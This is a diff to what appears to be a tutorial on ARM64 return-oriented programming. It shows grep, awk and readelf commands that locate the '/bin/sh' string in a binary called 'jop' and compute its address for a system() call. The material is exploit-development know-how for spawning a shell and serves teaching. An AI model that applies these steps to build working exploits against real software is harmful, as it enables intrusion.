@@ -39,15 +39,26 @@ void rop_symbol()
 system() api address is **0x406ae8**
 ### Useful string "/bin/sh" address
 According to the glibc do_system source code
-```assembly
-      /* Exec the shell.  */
-      (void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);
-      _exit (127);
+```bash
+$ grep -aPbo '/bin/sh'   jop
+326928:/bin/sh
 
-  406acc:	d0000240 	adrp	x0, 450000 <_nl_locale_subfreeres+0x1b8>
-  406ad0:	b900067f 	str	wzr, [x19, #4]
-  406ad4:	91344000 	add	x0, x0, #0xd10
-  406ad8:	9400475e 	bl	418850 <__execve>
+$readelf -l jop
+
+Elf file type is EXEC (Executable file)
+Entry point 0x4002b4
+There are 6 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000
+                 0x000000000006daeb 0x000000000006daeb  R E    0x10000
+```
+So string "/bin/sh" can be get with the following command: 
+```
+$grep -aPbo '/bin/sh'   jop |awk -F: '{ printf("0x%x + 0x400000\n",$1) }'
+0x50d10 + 0x400000
 ```
 String "/bin/sh" can be found at address **0x450d10**
 ### ROP example
